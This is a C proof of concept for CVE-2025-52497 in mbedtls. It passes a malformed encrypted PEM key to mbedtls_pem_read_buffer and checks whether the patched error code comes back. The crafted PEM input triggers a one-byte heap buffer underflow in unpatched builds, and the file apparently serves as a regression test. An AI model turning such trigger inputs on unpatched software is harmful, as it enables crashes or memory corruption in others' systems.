#include <stdio.h>
#include <string.h>

#include "mbedtls/pem.h"

/*
 * Minimal PoC for CVE-2025-52497.
 *
 * Regression-test-derived malformed encrypted PEM:
 * fewer than 4 base64 chars before the footer.
 *
 * Buggy behavior:
 *   decoded content length can become 0, then pem_check_pkcs_padding()
 *   reads input[input_len - 1], causing a one-byte heap buffer underflow.
 *
 * Fixed behavior:
 *   pem_check_pkcs_padding() rejects input_len < 1 with
 *   MBEDTLS_ERR_PEM_INVALID_DATA.
 */

int main(void)
{
    int ret;
    size_t use_len = 0;
    mbedtls_pem_context ctx;

    const char *header = "-----BEGIN EC PRIVATE KEY-----";
    const char *footer = "-----END EC PRIVATE KEY-----";
    const unsigned char password[] = "pwd";

    const unsigned char pem[] =
        "-----BEGIN EC PRIVATE KEY-----\n"
        "Proc-Type: 4,ENCRYPTED\n"
        "DEK-Info: AES-128-CBC,7BA38DE00F67851E4207216809C3BB15\n"
        "\n"
        "8Q-----END EC PRIVATE KEY-----";

    setbuf(stdout, NULL);

    mbedtls_pem_init(&ctx);

    printf("calling mbedtls_pem_read_buffer...\n");

    ret = mbedtls_pem_read_buffer(&ctx,
                                  header,
                                  footer,
                                  pem,
                                  password,
                                  strlen((const char *) password),
                                  &use_len);

    printf("ret=%d\n", ret);
    printf("expected fixed ret=%d\n", MBEDTLS_ERR_PEM_INVALID_DATA);
    printf("use_len=%zu\n", use_len);

    if (ret == MBEDTLS_ERR_PEM_INVALID_DATA) {
        printf("[OK] fixed behavior: malformed PEM rejected safely.\n");
    } else {
        printf("[INFO] returned without expected fixed error, ret=%d\n", ret);
    }

    mbedtls_pem_free(&ctx);
    return 0;
}
